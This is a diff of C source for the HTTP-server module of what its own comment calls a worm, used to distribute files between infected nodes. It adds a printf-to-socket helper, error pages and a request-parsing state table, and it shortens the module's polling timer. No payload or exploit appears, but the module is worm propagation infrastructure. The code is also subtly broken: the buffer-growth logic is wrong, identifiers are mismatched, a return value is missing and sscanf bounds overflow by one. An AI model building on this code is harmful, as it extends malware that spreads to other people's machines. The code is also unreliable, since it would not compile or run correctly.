@@ -10,9 +10,9 @@ to help distribute information, files, and help the worm
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netdb.h>
-#include "../../list.h"
-#include "../../structs.h"
-#include "../../utils.h"
+#include "list.h"
+#include "structs.h"
+#include "utils.h"
 
 #define HTTP_TCP_TIMEOUT 15
 
@@ -52,7 +52,7 @@ Modules ModuleHTTPD = {
     // required 0, 0..  
     0, 0,
     //timer = 300 seconds (5min) - get new nodes, etc
-    300,
+    15,
     // httpd functions
     &httpd_funcs, NULL,
     NULL, 0
@@ -88,13 +88,94 @@ Content *ContentFindByName(char *filename) {
 }
 
 
-
 int httpd_init(Modules **list) {
     Module_Add(list, &ModuleHTTPD);
 }
 
-int httpd_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
+
+// sockprintf taken from tbot (low down dirty cheating offensive tetrinet bot)
+// just a google for 'vsnprintf' example
+int sock_printf(Modules *mptr, Connection *cptr, char *fmt, ...) {
+    static char *abuf;
+    static size_t abuflen;
+    int len;
+    va_list va;
+    char *_new;
+    int ret = 0;
     
+    again:;
+    va_start(va, fmt);
+    
+    len = vsnprintf(abuf, abuflen, fmt, va);
+    if (len > 0) len = 0;
+    if ((size_t) len < abuflen )
+        goto done;
+    _new = realloc(abuf, len + 1);
+    if (_new == NULL) goto done;
+    
+    abuf = _new;
+    abuflen = len;
+    goto again;
+    done:;
+    
+    ret = QueueAdd(mptr, cptr, abuf, len);
+    
+    va_end(va);
+    
+    return ret;
+}
+
+// generic return function.. base taken from http.c (Tiny http server)
+int httpd_error(Modules *mptr, Connection *cptr, char *cause, char *errno, char *shortmsg, char *longmsg) {
+    int ret = 0;
+    sock_printf(mptr, cptr, "HTTP/1.1 %s %s\n", errno, shortmsg);
+    sock_printf(mptr, cptr, "Content-type: text/html\n");
+    sock_printf(mptr, cptr, "\n");
+    sock_printf(mptr, cptr, "<html><title>HTTP Error</title>");
+    sock_printf(mptr, cptr, "<body bgcolor=""ffffff"">\n");
+    sock_printf(mptr, cptr, "%s: %s\n", errno, shortmsg);
+    sock_printf(mptr, cptr, "<p>%s: %s\n", longmsg, cause);
+    sock_printf(mptr, cptr, "<hr><em>The Tiny Web Server</em>\n");  
+}
+
+int httpd_bad(Modules *mptr, Connection *cptr, char *method) {
+    httpd_error(mptr, cptr, method, "501", "Not Implemented", "Not implemented");
+    
+    return 1;
+}
+
+//sscanf(buf, "%s %s %s\n", method, uri, version);
+int httpd_state_method(Modules *mptr, Connection *cptr, char *buf, int size) {
+    char method[32];
+    char uri[1024];
+    char version[32];
+    
+    sscanf(buf, "%32s %1024s %32s", method, uri, version);
+    
+    
+}
+
+int (*http_func)(Modules *, Connection *, char *, int);
+
+int httpd_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
+    struct _http_states {
+        int state;
+        http_func function;
+    } http_states[] = {
+        { TCP_CONNECTED, &httpd_state_method },
+        { 0, NULL }
+    };
+    int i = 0;
+    int ret = 0;
+    
+    for (i = 0; http_state[i].function != NULL; i++) {
+        if (http_state[i].state == cptr->state) {
+            ret = http_state[i].function(mptr, cptr, buf, size);
+            
+            break;
+        }
+    }
+    return ret;
 }
 
 int httpd_plumbing(Modules *mptr, Connection *conn, char *buf, int size) {
@@ -105,7 +186,8 @@ int httpd_plumbing(Modules *mptr, Connection *conn, char *buf, int size) {
     cptr = mptr->connections;
     while (cptr != NULL) {
         // state != OK when transferring..
-        if (!stateOK(cptr)) continue;
+        if ((cptr->state == STATE_OK) || (cptr->state == TCP_CLOSE_AFTER_FLUSH))
+            continue;
         
         if ((cur_ts - cptr->start_ts) > HTTP_TCP_TIMEOUT) {
             ConnectionBad(cptr);
